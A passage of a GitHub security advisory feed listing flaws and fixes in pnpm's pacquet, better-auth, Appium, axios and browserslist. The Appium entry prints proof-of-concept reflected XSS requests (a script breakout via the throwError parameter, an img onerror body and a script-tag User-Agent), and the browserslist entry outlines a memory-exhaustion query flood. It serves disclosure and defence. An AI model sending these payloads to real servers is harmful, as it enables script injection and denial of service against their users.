<li><a href="https://github.com/pnpm/pnpm/pull/12898">https://github.com/pnpm/pnpm/pull/12898</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/36928beae9afb64a2a6a1221df54e66d361320c8">https://github.com/pnpm/pnpm/commit/36928beae9afb64a2a6a1221df54e66d361320c8</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/5a4daec4bd5f0170b18ae053aff093eea56368ba">https://github.com/pnpm/pnpm/commit/5a4daec4bd5f0170b18ae053aff093eea56368ba</a></li>
<li><a href="https://github.com/orgs/pnpm/discussions/13598">https://github.com/orgs/pnpm/discussions/13598</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v10.34.5">https://github.com/pnpm/pnpm/releases/tag/v10.34.5</a></li>
<li><a href="https://github.com/pnpm/pnpm/releases/tag/v11.11.0">https://github.com/pnpm/pnpm/releases/tag/v11.11.0</a></li>
<li><a href="https://github.com/advisories/GHSA-vx52-2968-3vc6">https://github.com/advisories/GHSA-vx52-2968-3vc6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vx52-2968-3vc6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-01T19:22:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm: pacquet trust-lockfile install can create dependency symlinks outside the project]]></title>
        <id>https://github.com/advisories/GHSA-2rx9-3g3h-c2jv</id>
        <link href="https://github.com/advisories/GHSA-2rx9-3g3h-c2jv"/>
        <updated>2026-09-01T18:59:24.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A crafted lockfile alias could reach several install-time filesystem joins. With <code>--trust-lockfile</code> or a frozen lockfile, traversal segments could create links outside the intended project or <code>node_modules</code> boundary. This patch validates dependency names and every virtual-store slot before creating directories, links, bins, or hoisted entries.</p>
<h2 id="security-boundary">Security boundary</h2>
<ul>
<li>A shared safe-join helper rejects traversal, absolute, platform-specific, and reserved dependency names before filesystem materialization.</li>
<li>Direct and transitive dependency links, package links, bin destinations, and public/private hoist destinations use the same containment rule.</li>
<li>Global virtual-store slots validate the complete slot path, including version-derived components, before directory creation.</li>
<li>Snapshot slots and package names are checked before store initialization and before the current-lockfile fast path, closing the warm-install bypass.</li>
<li>Rejections preserve <code>ERR_PNPM_INVALID_DEPENDENCY_NAME</code>.</li>
</ul>
<h2 id="exploit-replay">Exploit replay</h2>
<p>Before the patch, <code>pacquet install --frozen-lockfile --trust-lockfile</code> accepted a <code>../../escaped-link</code> dependency key and created a symlink outside the project. With this patch, the same lockfile is rejected before materialization and no outside link is created.</p>
<h2 id="files-changed">Files changed</h2>
<ul>
<li><code>pacquet/crates/package-manager/src/safe_join_modules_dir.rs</code> defines the shared containment rule.</li>
<li>Install, symlink, bin, hoist, virtual-store, and frozen-lockfile paths call that helper before filesystem materialization.</li>
<li>The corresponding <code>tests.rs</code> files cover every sink, including warm installs and global virtual-store slots.</li>
</ul>
<h2 id="commands-run">Commands run</h2>
<pre><code class="language-text">$ cargo test --locked -p pacquet-package-manager --lib
PASS: 434 tests
$ cargo clippy --locked -p pacquet-package-manager --all-targets -- --deny warnings
PASS
$ cargo fmt --all -- --check
PASS
</code></pre>
<h2 id="validation">Validation</h2>
<ul>
<li>Full pacquet package-manager suite: 434 passed.</li>
<li>Focused regressions cover direct and transitive aliases, bins, hoists, package names, global virtual-store version traversal, and a poisoned prior-install slot.</li>
<li><code>cargo clippy -p pacquet-package-manager --all-targets -- -D warnings</code>: passed.</li>
<li><code>cargo fmt --all -- --check</code> and <code>git diff --check</code>: passed.</li>
</ul>
<h2 id="compatibility">Compatibility</h2>
<p>Valid unscoped and scoped dependency aliases continue to work. The reproduced escape was specific to pacquet, so this branch does not change the TypeScript CLI or the lockfile format.</p>
<hr>
<p>Written by an agent (Codex, GPT-5).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-2rx9-3g3h-c2jv">https://github.com/pnpm/pnpm/security/advisories/GHSA-2rx9-3g3h-c2jv</a></li>
<li><a href="https://github.com/pnpm/pnpm/pull/12872">https://github.com/pnpm/pnpm/pull/12872</a></li>
<li><a href="https://github.com/pnpm/pnpm/commit/51300fd41c5e4c8f47635108e373cc3d1f324fa7">https://github.com/pnpm/pnpm/commit/51300fd41c5e4c8f47635108e373cc3d1f324fa7</a></li>
<li><a href="https://github.com/advisories/GHSA-2rx9-3g3h-c2jv">https://github.com/advisories/GHSA-2rx9-3g3h-c2jv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2rx9-3g3h-c2jv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-01T18:59:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[better-auth] Duplicate Advisory: better-auth has an external request basePath modification DoS]]></title>
        <id>https://github.com/advisories/GHSA-3q45-2fh7-66cj</id>
        <link href="https://github.com/advisories/GHSA-3q45-2fh7-66cj"/>
        <updated>2026-09-01T18:56:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-569q-mpph-wgww. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>better-auth (npm) before 1.4.2 allows an external request to configure baseURL when it is not otherwise defined (e.g., BETTER_AUTH_URL is unset). An attacker able to make the very first request to the server after startup can poison the router's base path, causing all routes to return 404 for all users (denial of service). The issue is not reachable when baseURL is explicitly configured or on typical managed hosting platforms.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/better-auth/better-auth/security/advisories/GHSA-569q-mpph-wgww">https://github.com/better-auth/better-auth/security/advisories/GHSA-569q-mpph-wgww</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-71401">https://nvd.nist.gov/vuln/detail/CVE-2025-71401</a></li>
<li><a href="https://www.vulncheck.com/advisories/better-auth-before-basepath-modification-dos">https://www.vulncheck.com/advisories/better-auth-before-basepath-modification-dos</a></li>
<li><a href="https://github.com/advisories/GHSA-3q45-2fh7-66cj">https://github.com/advisories/GHSA-3q45-2fh7-66cj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3q45-2fh7-66cj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-08-02T15:30:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@appium/base-driver] Appium: Reflected XSS / arbitrary JS in @appium/base-driver /test/guinea-pig* routes]]></title>
        <id>https://github.com/advisories/GHSA-3wgp-x9p5-c7cc</id>
        <link href="https://github.com/advisories/GHSA-3wgp-x9p5-c7cc"/>
        <updated>2026-09-01T18:54:53.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Appium's base-driver mounts the built-in <code>/test/guinea-pig</code>, <code>/test/guinea-pig-scrollable</code> and <code>/test/guinea-pig-app-banner</code> routes <strong>unconditionally</strong> on every server. The handler reflects the <code>throwError</code> query param, the <code>comments</code> POST field, and the <code>User-Agent</code> request header into the returned HTML via <code>compileLodashTemplate</code>, which interpolates <code>&lt;%= expr %&gt;</code> as <code>String(expr)</code> with <strong>no HTML/JS escaping</strong>. This yields reflected XSS, and the <code>throwError</code> value is reflected <strong>inside a <code>&lt;script&gt;</code> block</strong>, giving arbitrary JavaScript execution on the server's origin. No authentication, no session, no driver and no plugin are required, and the default bind address is <code>0.0.0.0</code>.</p>
<h2 id="details">Details</h2>
<h3 id="affected">Affected</h3>
<ul>
<li><code>@appium/base-driver</code> <strong>10.6.0</strong> (with Appium server <strong>3.5.0</strong>); tested live.</li>
<li>Template engine helper: <code>@appium/base-driver</code> <code>lib/utils.ts</code> <code>compileLodashTemplate</code>.</li>
</ul>
<h3 id="location-fileline">Location (file:line)</h3>
<ul>
<li>Routes mounted unconditionally: <code>base-driver/lib/express/server.ts:216-219</code>
(<code>app.all('/test/guinea-pig', guineaPig)</code> etc.).</li>
<li>Tainting: <code>base-driver/lib/express/static.ts:35-61</code> (<code>guineaPigTemplate</code>) —
<code>throwError = String(req.params.throwError ?? req.query?.throwError)</code>, <code>params.comment = String(req.body.comments)</code>, <code>params.userAgent = req.headers['user-agent']</code>.</li>
<li>Unescaped render: <code>base-driver/lib/utils.ts:67-83</code> (<code>compileLodashTemplate</code>)
emits <code>&lt;%= expr %&gt;</code> as <code>String(${expr})</code> via <code>new Function(...)</code>, no escaping.</li>
<li>Sinks (shipped templates): <code>base-driver/static/test/guinea-pig.html:11-12</code>
(<code>throwError</code> inside <code>&lt;script&gt;</code>), <code>:50</code> (<code>comment</code>), <code>:87</code> (<code>userAgent</code>); same in <code>guinea-pig-scrollable.html</code> / <code>guinea-pig-app-banner.html</code>.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Requests:</p>
<pre><code>GET /test/guinea-pig?throwError=x%27%2balert(document.domain)%2b%27
POST /test/guinea-pig         (body: comments=&lt;/span&gt;&lt;img src=x onerror=alert(1)&gt;)
GET  /test/guinea-pig         (header: User-Agent: &lt;script&gt;alert(7)&lt;/script&gt;)
</code></pre>
<img width="973" height="276" alt="image" src="https://github.com/user-attachments/assets/f58e1dce-f3ad-43d3-b66e-1ff5efea3866">


<h3 id="impact">Impact</h3>
<p>An attacker who can get a victim to open a crafted link (or auto-submit a form) to the Appium server executes arbitrary JavaScript on the server's origin. With default CORS <code>*</code> + no authentication, that JS can drive the WebDriver REST API and plugin endpoints. The endpoints are debug/test fixtures that should not be reachable on a production listener at all.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/appium/appium/security/advisories/GHSA-3wgp-x9p5-c7cc">https://github.com/appium/appium/security/advisories/GHSA-3wgp-x9p5-c7cc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-58191">https://nvd.nist.gov/vuln/detail/CVE-2026-58191</a></li>
<li><a href="https://github.com/appium/appium/pull/22394">https://github.com/appium/appium/pull/22394</a></li>
<li><a href="https://github.com/appium/appium/commit/d94a40af9f8040191ee7888571a1c9d5aec59f89">https://github.com/appium/appium/commit/d94a40af9f8040191ee7888571a1c9d5aec59f89</a></li>
<li><a href="https://github.com/appium/appium/releases/tag/@appium/base-driver@10.7.0">https://github.com/appium/appium/releases/tag/@appium/base-driver@10.7.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3wgp-x9p5-c7cc">https://github.com/advisories/GHSA-3wgp-x9p5-c7cc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3wgp-x9p5-c7cc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-01T18:54:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios Node HTTP adapter can use an inherited proxy after interceptor config cloning]]></title>
        <id>https://github.com/advisories/GHSA-68jp-44vc-2x5h</id>
        <link href="https://github.com/advisories/GHSA-68jp-44vc-2x5h"/>
        <updated>2026-09-01T18:42:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-gcfj-64vw-6mp9. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>axios in a Node.js deployment using the HTTP adapter can route requests through an attacker-controlled proxy. axios hardens merged request configuration by creating a null-prototype object, but request interceptors run after the merge; a common immutable interceptor pattern such as {...config} or Object.assign({}, config) converts the hardened config back into a regular object. axios then dispatches that object without re-hardening it, and the Node HTTP adapter reads config.proxy through the prototype chain. If an attacker can pollute Object.prototype.proxy, affected requests can be routed through an attacker-controlled proxy. For plaintext HTTP requests, the proxy can observe Authorization headers, Basic auth from config.auth, method, absolute URL, Host, and request body, and can return its own response. This does not establish browser impact or HTTPS header/body disclosure under normal TLS validation. Affected versions are &gt;=0.31.1 (fixed in 0.33.0) and &gt;=1.15.2 (fixed in 1.18.0).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-gcfj-64vw-6mp9">https://github.com/axios/axios/security/advisories/GHSA-gcfj-64vw-6mp9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67320">https://nvd.nist.gov/vuln/detail/CVE-2026-67320</a></li>
<li><a href="https://github.com/axios/axios/commit/df53d7dd99b202fb194217abd127ae6a630e70dc">https://github.com/axios/axios/commit/df53d7dd99b202fb194217abd127ae6a630e70dc</a></li>
<li><a href="https://www.vulncheck.com/advisories/axios-before-prototype-pollution-via-node-http-adapter">https://www.vulncheck.com/advisories/axios-before-prototype-pollution-via-node-http-adapter</a></li>
<li><a href="https://github.com/advisories/GHSA-68jp-44vc-2x5h">https://github.com/advisories/GHSA-68jp-44vc-2x5h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-68jp-44vc-2x5h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-01T15:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios: Nested axios option objects can consume polluted prototype values]]></title>
        <id>https://github.com/advisories/GHSA-9wx3-p993-35vp</id>
        <link href="https://github.com/advisories/GHSA-9wx3-p993-35vp"/>
        <updated>2026-09-01T18:41:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-7q8q-rj6j-mhjq. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>axios before 0.33.0 (and 1.x before 1.18.0) can consume inherited properties from nested request option objects when the JavaScript process's Object.prototype has already been polluted by another component. While the top-level merged config uses a null prototype, nested plain objects such as auth and paramsSerializer are cloned into ordinary objects and read without own-property checks. When an application passes placeholder nested objects such as auth: {} or paramsSerializer: {}, inherited username/password values can cause silent injection of an Authorization: Basic header, and inherited encode/serialize values can alter query-string serialization (full serializer replacement requires a function-valued pollution primitive). This is exploitable only in the presence of pre-existing prototype pollution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-7q8q-rj6j-mhjq">https://github.com/axios/axios/security/advisories/GHSA-7q8q-rj6j-mhjq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67319">https://nvd.nist.gov/vuln/detail/CVE-2026-67319</a></li>
<li><a href="https://www.vulncheck.com/advisories/axios-before-prototype-pollution-via-nested-option-objects">https://www.vulncheck.com/advisories/axios-before-prototype-pollution-via-nested-option-objects</a></li>
<li><a href="https://github.com/advisories/GHSA-9wx3-p993-35vp">https://github.com/advisories/GHSA-9wx3-p993-35vp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9wx3-p993-35vp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-01T15:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios: Excessive recursion in formDataToJSON can cause denial of service]]></title>
        <id>https://github.com/advisories/GHSA-fq2j-3j99-rx65</id>
        <link href="https://github.com/advisories/GHSA-fq2j-3j99-rx65"/>
        <updated>2026-09-01T18:40:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-42h9-826w-cgv3. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>axios versions 0.28.0 and later contain uncontrolled recursion in formDataToJSON when processing FormData field names with deeply nested bracket segments. Attackers can supply FormData with field names containing thousands of nested brackets to exhaust the JavaScript call stack and trigger RangeError, causing request failure or process termination in applications that do not handle the exception.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-42h9-826w-cgv3">https://github.com/axios/axios/security/advisories/GHSA-42h9-826w-cgv3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67313">https://nvd.nist.gov/vuln/detail/CVE-2026-67313</a></li>
<li><a href="https://www.vulncheck.com/advisories/axios-before-denial-of-service-via-formdatatojson">https://www.vulncheck.com/advisories/axios-before-denial-of-service-via-formdatatojson</a></li>
<li><a href="https://github.com/advisories/GHSA-fq2j-3j99-rx65">https://github.com/advisories/GHSA-fq2j-3j99-rx65</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fq2j-3j99-rx65</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-01T15:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios: NO_PROXY bypass for 0.0.0.0 local addresses in axios]]></title>
        <id>https://github.com/advisories/GHSA-6hqm-hm2v-3p2p</id>
        <link href="https://github.com/advisories/GHSA-6hqm-hm2v-3p2p"/>
        <updated>2026-09-01T18:38:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-f4gw-2p7v-4548. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>axios versions 1.15.0 before 1.18.0 fail to recognize 0.0.0.0 as a loopback address in shouldBypassProxy.js, allowing requests to 0.0.0.0 to bypass NO_PROXY rules. Attackers can supply 0.0.0.0 URLs to route requests through configured proxies, potentially exposing local services when the proxy can reach the destination.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-f4gw-2p7v-4548">https://github.com/axios/axios/security/advisories/GHSA-f4gw-2p7v-4548</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67315">https://nvd.nist.gov/vuln/detail/CVE-2026-67315</a></li>
<li><a href="https://www.vulncheck.com/advisories/axios-before-no-proxy-bypass-via">https://www.vulncheck.com/advisories/axios-before-no-proxy-bypass-via</a></li>
<li><a href="https://github.com/advisories/GHSA-6hqm-hm2v-3p2p">https://github.com/advisories/GHSA-6hqm-hm2v-3p2p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hqm-hm2v-3p2p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-01T15:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios: Fetch adapter `ReadableStream` uploads bypass `maxBodyLength`]]></title>
        <id>https://github.com/advisories/GHSA-39j5-w47m-2gmv</id>
        <link href="https://github.com/advisories/GHSA-39j5-w47m-2gmv"/>
        <updated>2026-09-01T18:37:50.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-jqh4-m9w3-8hp9. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>axios versions 1.7.0 before 1.18.0 fail to enforce maxBodyLength for WHATWG ReadableStream request bodies in the fetch adapter when Content-Length cannot be determined. Attackers can supply unknown-length stream data to bypass upload size limits and cause uncontrolled network egress or resource exhaustion.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-jqh4-m9w3-8hp9">https://github.com/axios/axios/security/advisories/GHSA-jqh4-m9w3-8hp9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67317">https://nvd.nist.gov/vuln/detail/CVE-2026-67317</a></li>
<li><a href="https://www.vulncheck.com/advisories/axios-before-maxbodylength-bypass-via-readablestream">https://www.vulncheck.com/advisories/axios-before-maxbodylength-bypass-via-readablestream</a></li>
<li><a href="https://github.com/advisories/GHSA-39j5-w47m-2gmv">https://github.com/advisories/GHSA-39j5-w47m-2gmv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-39j5-w47m-2gmv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-01T15:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios: HTTP/2 streamed uploads bypass `maxBodyLength`]]></title>
        <id>https://github.com/advisories/GHSA-fqj3-h9pc-443h</id>
        <link href="https://github.com/advisories/GHSA-fqj3-h9pc-443h"/>
        <updated>2026-09-01T18:35:35.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-mwf2-3pr3-8698. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>axios versions &gt;=1.13.0 (Node.js HTTP adapter) fail to enforce the configured maxBodyLength limit on streamed request bodies when requests are sent with httpVersion: 2. Because Node's HTTP/2 request API does not honor the maxBodyLength option and axios's byte-counting stream wrapper is gated on maxRedirects === 0, an attacker who controls a stream passed to axios can cause the application to transmit outbound data exceeding the configured finite maxBodyLength. Impact is limited to resource consumption and policy bypass (excess egress, upstream quota consumption, limited availability); it does not enable code execution, credential disclosure, or request-destination control. Calls using the default maxBodyLength: -1 and browser adapters are not affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-mwf2-3pr3-8698">https://github.com/axios/axios/security/advisories/GHSA-mwf2-3pr3-8698</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67318">https://nvd.nist.gov/vuln/detail/CVE-2026-67318</a></li>
<li><a href="https://www.vulncheck.com/advisories/axios-before-maxbodylength-bypass-via-http-2">https://www.vulncheck.com/advisories/axios-before-maxbodylength-bypass-via-http-2</a></li>
<li><a href="https://github.com/advisories/GHSA-fqj3-h9pc-443h">https://github.com/advisories/GHSA-fqj3-h9pc-443h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fqj3-h9pc-443h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-01T15:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[browserslist] Browserslist: Unbounded memory growth (no cache eviction) via distinct query results, leading to eventual OOM]]></title>
        <id>https://github.com/advisories/GHSA-c83g-rgw3-j3cx</id>
        <link href="https://github.com/advisories/GHSA-c83g-rgw3-j3cx"/>
        <updated>2026-09-01T16:42:15.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability-details">Vulnerability Details</h2>
<p><strong>File</strong>: <code>index.js</code>
<strong>Location</strong>: <code>cache</code> (browserslist()'s result cache, line ~402) and
<code>parseCache</code> (parseQueries()'s AST cache)</p>
<h3 id="root-cause">Root Cause</h3>
<pre><code class="language-js">var cache = {}
var parseCache = {}

function browserslist(queries, opts) {
  ...
  var cacheKey = JSON.stringify([queries, context])
  if (cache[cacheKey]) return cache[cacheKey]
  ...
  if (!env.env.BROWSERSLIST_DISABLE_CACHE) { cache[cacheKey] = result }
  return result
}

function parseQueries(queries) {
  var cacheKey = JSON.stringify(queries)
  if (cacheKey in parseCache) return parseCache[cacheKey]
  var result = parseWithoutCache(QUERIES, queries)
  if (!env.env.BROWSERSLIST_DISABLE_CACHE) { parseCache[cacheKey] = result }
  ...
}
</code></pre>
<p>Every distinct <code>(queries, context)</code> pair is cached forever — no size cap,
TTL, or eviction. <code>browserslist.clearCaches()</code> never resets either object
(it only resets <code>node.js</code>'s own filesystem caches); the only opt-out is the
<code>BROWSERSLIST_DISABLE_CACHE</code> env var, controlled by the <em>calling
application</em>, not an attacker.</p>
<p>Some short, valid queries amplify this badly. The <code>since &lt;year&gt;-&lt;month&gt;-&lt;day&gt;</code>
query type (<code>/^since (\d+)-(\d+)-(\d+)$/i</code>) accepts <strong>any</strong> digit
combination — <code>Date.UTC()</code> normalizes rather than rejects out-of-range
values — giving an effectively unbounded space of ~17-byte distinct cache
keys, each of which resolves to (and caches) a result close to the full
~8.5 KB browser list for any sufficiently old year.</p>
<h3 id="measured-impact">Measured Impact</h3>
<p>20,000 distinct <code>since &lt;year&gt;-&lt;month&gt;-&lt;day&gt;</code> queries (~330 KB total input,
<code>--expose-gc</code> before/after measurement to rule out uncollected garbage)
retained <strong>over 50 MB</strong> of heap permanently — roughly <strong>150x</strong>
amplification, growing linearly with no cap observed up to 40,000 queries
(52.3 MB).</p>
<h3 id="attack-scenario">Attack Scenario</h3>
<p>Any long-running process (server, daemon, warm CI worker) that calls
<code>browserslist()</code> with a query value that varies across requests/items and is
influenced, even partially, by external input accumulates one cache entry
per distinct value ever seen. An attacker who can influence that value
across <em>many</em> requests (this is a volumetric attack, unlike the
single-request DoS findings from this same research pass) sends a stream of
cheap, distinct queries (e.g. <code>since 1900-01-01</code>, <code>since 1900-01-02</code>, ...)
until the process runs out of memory and crashes.</p>
<h3 id="recommended-fix-implemented-and-verified">Recommended Fix (implemented and verified)</h3>
<p>Replace both plain-object caches with <code>Map</code>s bounded to a fixed maximum
entry count, evicting the oldest entry once the cap is reached (<code>Map</code>
preserves insertion order, so <code>.keys().next().value</code> is always oldest):</p>
<pre><code class="language-js">var CACHE_MAX_ENTRIES = 500

function boundedCacheSet(map, key, value) {
  if (map.size &gt;= CACHE_MAX_ENTRIES) {
    map.delete(map.keys().next().value)
  }
  map.set(key, value)
}

var cache = new Map()
var parseCache = new Map()
</code></pre>
<p>(read sites changed to <code>.has()</code>/<code>.get()</code>, write sites to <code>boundedCacheSet()</code>)</p>
<p><strong>Verification</strong>:</p>
<ul>
<li><code>NODE_ENV=test npx uvu test .test.js</code> → 301/301 pass unmodified
(<code>test/cache.test.js</code> exercises <code>clearCaches()</code>/<code>BROWSERSLIST_DISABLE_CACHE</code>
against <code>node.js</code>'s separate filesystem caches, unaffected here); confirmed
a repeated identical call still returns the cached reference.</li>
<li>Re-ran the memory PoC post-fix: heap stayed flat at ~4.9 MB after 5,000,
10,000, 20,000, and 40,000 distinct <code>since</code>-date queries (was
10.5 → 16.5 → 28.4 → 52.3 MB pre-fix).</li>
</ul>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Who is affected</strong>: Long-running processes calling <code>browserslist()</code> with
query values that vary across requests/items and are influenced by
external input.</li>
<li><strong>What an attacker achieves</strong>: DoS via eventual out-of-memory crash, given
sustained traffic over time (not a single small payload).</li>
<li><strong>Conditions required</strong>: No authentication; requires volume rather than a
single request, hence Medium rather than High severity.</li>
</ul>
<h3 id="verification-environment">Verification Environment</h3>
<p>browserslist @ HEAD (== v4.28.6, current latest stable release) under local
Node.js v20.19.5, run with <code>--expose-gc</code> for accurate heap measurement.</p>
<h3 id="note">Note</h3>
<p>Found during a broader review of this codebase in the same research pass
that produced GHSA-rrmg-cfrq-23vv (parse.js algorithmic complexity),
GHSA-g6p8-hj8g-x889 (baseline regexp ReDoS), GHSA-73wf-gq98-2v4g
(normalizeStats crash/prototype write), and GHSA-h633-868p-5rfw
(SCOPED_CONFIG__PATTERN ReDoS) — all single-request DoS vectors. This one is
different in character (volumetric, not single-request) and is reported
separately/scored lower accordingly.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/browserslist/browserslist/security/advisories/GHSA-c83g-rgw3-j3cx">https://github.com/browserslist/browserslist/security/advisories/GHSA-c83g-rgw3-j3cx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73089">https://nvd.nist.gov/vuln/detail/CVE-2026-73089</a></li>
<li><a href="https://github.com/browserslist/browserslist/commit/f2931a3ff2a3a31abf84ef01a7400b270aad6405">https://github.com/browserslist/browserslist/commit/f2931a3ff2a3a31abf84ef01a7400b270aad6405</a></li>
<li><a href="https://github.com/browserslist/browserslist/releases/tag/4.28.7">https://github.com/browserslist/browserslist/releases/tag/4.28.7</a></li>
<li><a href="https://github.com/advisories/GHSA-c83g-rgw3-j3cx">https://github.com/advisories/GHSA-c83g-rgw3-j3cx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c83g-rgw3-j3cx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-01T16:42:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[browserslist] Browserslist: Uncaught crash / prototype write via untrusted browserslist-stats.json custom stats (normalizeStats)]]></title>
        <id>https://github.com/advisories/GHSA-73wf-gq98-2v4g</id>
        <link href="https://github.com/advisories/GHSA-73wf-gq98-2v4g"/>
        <updated>2026-09-01T16:41:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="vulnerability-details">Vulnerability Details</h2>
<p><strong>File</strong>: <code>node.js</code>
<strong>Function</strong>: <code>normalizeStats()</code> (line ~214), reached from <code>getStat()</code> (called
<strong>unconditionally</strong> on every <code>browserslist()</code> call) and <code>loadStat()</code></p>
<h3 id="root-cause">Root Cause</h3>
<pre><code class="language-js">function normalizeStats(data, stats) {
  if (!data) { data = {} }
  if (stats &amp;&amp; 'dataByBrowser' in stats) { stats = stats.dataByBrowser }
  if (typeof stats !== 'object') return undefined

  var normalized = {}
  for (var i in stats) {
    var versions = Object.keys(stats[i])
